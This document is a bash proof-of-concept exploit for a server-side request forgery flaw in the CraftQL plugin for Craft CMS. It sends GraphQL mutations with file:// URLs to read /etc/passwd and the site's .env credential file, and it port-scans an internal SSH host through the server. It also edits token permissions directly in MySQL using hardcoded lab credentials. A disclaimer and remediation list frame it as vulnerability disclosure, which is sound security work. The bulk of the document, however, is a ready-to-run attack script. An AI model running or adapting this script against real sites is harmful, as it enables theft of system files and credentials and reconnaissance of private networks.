#!/bin/bash
#
# ============================================================================
# CraftQL SSRF Exploit POC (Bash Version)
# ============================================================================
#
# Vulnerability: Server-Side Request Forgery in CraftQL Plugin
# Impact: Craft CMS 3.x + CraftQL <= 1.3.7
# Severity: High (CVSS 7.5)
#
# Usage:
#   bash ssrf_poc.sh
#
# Disclaimer:
#   For authorized security testing and educational purposes only.
# ============================================================================

set -e

# ============================================================================
# Configuration
# ============================================================================

DB_USER="craftuser"
DB_PASS="craft123456"
DB_NAME="craftcms3"
TOKEN="l-ir-ck7****************************NUcySD"
API_URL="http://192.168.131.129:8888/index.php?p=api"
PROJECT_PATH="/home/ubuntu/projects/craft-ssrf-test"
TIMEOUT=60

# ============================================================================
# Color Output
# ============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ============================================================================
# Utility Functions
# ============================================================================

print_banner() {
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   CraftQL SSRF Exploit POC (Bash)                  ║${NC}"
    echo -e "${CYAN}║   CVE: Pending Assignment                            ║${NC}"
    echo -e "${CYAN}║   Severity: HIGH (CVSS 7.5)                           ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_info() {
    echo -e "${YELLOW}[+]${NC} $1"
}

log_poc() {
    echo -e "${RED}[POC #$1]${NC} $2"
}

# ============================================================================
# Vulnerability Check
# ============================================================================

check_vulnerability() {
    log_info "Checking for vulnerable code..."

    VULN_FILE="$PROJECT_PATH/vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php"

    if [ ! -f "$VULN_FILE" ]; then
        log_error "CraftQL plugin not found"
        return 1
    fi

    if grep -q "file_get_contents(\\\$remoteUrl)" "$VULN_FILE"; then
        log_success "Vulnerable code found!"
        return 0
    else
        log_error "Vulnerable code not found (may be patched)"
        return 1
    fi
}

# ============================================================================
# API Configuration
# ============================================================================

configure_token() {
    log_info "Configuring token permissions..."

    mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" << 'SQL' 2>/dev/null
UPDATE craftql_tokens
SET scopes = JSON_OBJECT(
  'query:sites', '1',
  'query:entries', '1',
  'query:assets', '1',
  'query:entryType:1', '1',
  'mutate:entryType:1', '1'
)
WHERE id = 1;
SQL

    if [ $? -eq 0 ]; then
        log_success "Token permissions updated"
        return 0
    else
        log_error "Failed to update token"
        return 1
    fi
}

clear_cache() {
    log_info "Clearing cache..."
    rm -rf "$PROJECT_PATH/storage/runtime/cache/"*
    rm -rf "$PROJECT_PATH/storage/runtime/compiled_templates/"*
    log_success "Cache cleared"
}

check_api() {
    log_info "Checking GraphQL API..."

    RESPONSE=$(curl -s -X POST "$API_URL" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"query": "{ __schema { mutationType { fields { name } } } }"}')

    if echo "$RESPONSE" | grep -q "upsertTestDefault"; then
        log_success "GraphQL API accessible"
        log_success "Mutation 'upsertTestDefault' is exposed"
        return 0
    else
        log_error "Mutation not exposed"
        return 1
    fi
}

# ============================================================================
# Exploitation Functions
# ============================================================================

execute_mutation() {
    local url="$1"
    local title="$2"
    local escaped_url=$(echo "$url" | sed 's/"/\\"/g')

    curl -s -X POST "$API_URL" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"query\": \"mutation { upsertTestDefault(title: \\\"$title\\\", heroImage: {url: \\\"$escaped_url\\\"}) { id } }\"}" \
        --max-time $TIMEOUT
}

get_latest_file() {
    find "$PROJECT_PATH/storage/runtime/temp" -type f -mmin -1 -name "*.tmp" 2>/dev/null | sort | tail -1
}

poc_file_read() {
    local poc_num="$1"
    local filepath="$2"
    local description="$3"

    log_poc "$poc_num" "$description"
    echo "─────────────────────────────────────────────────────────────"
    echo -e "${CYAN}Target:${NC} $filepath"
    echo ""

    execute_mutation "file://$filepath" "SSRF POC$poc_num" > /dev/null 2>&1

    sleep 1

    downloaded_file=$(get_latest_file)

    if [ -n "$downloaded_file" ] && [ -f "$downloaded_file" ]; then
        log_success "File downloaded: $downloaded_file"
        echo ""
        echo "File content (first 10 lines):"
        head -10 "$downloaded_file"
        echo "..."
    else
        log_error "Failed to download file"
    fi

    echo ""
}

poc_port_scan() {
    local poc_num="$1"
    local host="$2"
    local port="$3"
    local description="$4"

    log_poc "$poc_num" "$description"
    echo "─────────────────────────────────────────────────────────────"
    echo -e "${CYAN}Target:${NC} $host:$port"
    echo ""

    log_info "Scanning port..."

    local start_time=$(date +%s)

    execute_mutation "http://$host:$port/" "SSRF Port Scan" > /dev/null 2>&1 &
    local curl_pid=$!

    for i in {1..5}; do
        if ! ps -p $curl_pid > /dev/null 2>&1; then
            break
        fi
        sleep 1
        echo -n "."
    done

    if ps -p $curl_pid > /dev/null 2>&1; then
        kill $curl_pid 2>/dev/null
        echo ""
        log_success "Port may be OPEN (connection timeout)"
    else
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        echo ""

        if [ $duration -lt 2 ]; then
            log_info "Port may be CLOSED (fast response: ${duration}s)"
        else
            log_success "Port may be OPEN (response time: ${duration}s)"
        fi
    fi

    echo ""
}

# ============================================================================
# Main Execution
# ============================================================================

main() {
    print_banner

    # Check vulnerability
    if ! check_vulnerability; then
        log_error "Vulnerability check failed"
        exit 1
    fi

    echo ""

    # Configure environment
    configure_token
    clear_cache
    check_api

    if [ $? -ne 0 ]; then
        log_error "API configuration failed"
        exit 1
    fi

    echo ""

    # Start exploitation
    echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║   Starting SSRF Exploitation                         ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # POC #1: Read /etc/passwd
    poc_file_read "1" "/etc/passwd" "Read local file /etc/passwd"

    # POC #2: Read .env
    poc_file_read "2" "$PROJECT_PATH/.env" "Read configuration file .env"

    # POC #3: Port scan
    poc_port_scan "3" "192.168.131.2" "22" "Internal port scan (SSH)"

    # Summary
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   Exploitation Summary                                ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${GREEN}✓ Successful Attacks:${NC}"
    echo "  • [POC #1] Read /etc/passwd - System user disclosure"
    echo "  • [POC #2] Read .env - Database credentials leak"
    echo "  • [POC #3] Port scan - Internal network topology"
    echo ""

    echo -e "${YELLOW}⚠  Risk Assessment:${NC}"
    echo "  • Severity: HIGH"
    echo "  • CVSS Score: 7.5"
    echo "  • Exploitability: LOW"
    echo "  • Impact: HIGH (data leak, internal breach)"
    echo ""

    echo -e "${YELLOW}🛡️  Remediation:${NC}"
    echo "  1. Add URL protocol whitelist (http/https only)"
    echo "  2. Implement domain whitelist validation"
    echo "  3. Block private IP address access"
    echo "  4. Replace file_get_contents() with Guzzle"
    echo "  5. Upgrade to latest CraftQL version"
    echo ""

    echo "═══════════════════════════════════════════════════════════"
    echo -e "${GREEN}✓ Exploit Completed!${NC}"
    echo "═══════════════════════════════════════════════════════════"
    echo ""
}

main "$@"
